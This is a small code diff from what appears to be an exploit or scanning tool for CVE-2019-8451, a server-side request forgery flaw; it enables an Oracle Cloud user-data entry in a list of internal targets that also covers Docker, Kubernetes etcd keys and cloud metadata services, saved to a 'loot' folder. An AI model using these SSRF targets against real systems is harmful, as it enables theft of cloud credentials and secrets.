@@ -41,7 +41,7 @@ def check_cve_2019_8451(base_url, output_folder="loot/"):
                 "Docker Containers": "127.0.0.1:2375/v1.24/containers/json",
                 "Kubernetes ETCD API keys": "127.0.0.1:2379/v2/keys/?recursive=true",
                 "Digital Ocean Metadata":"169.254.169.254/metadata/v1.json",
-                # "Oracle Cloud":"192.0.0.192/latest/user-data/",
+                "Oracle Cloud":"192.0.0.192/latest/user-data/",
                 "Tencent Cloud":"metadata.tencentyun.com/latest/meta-data/",
             }
 
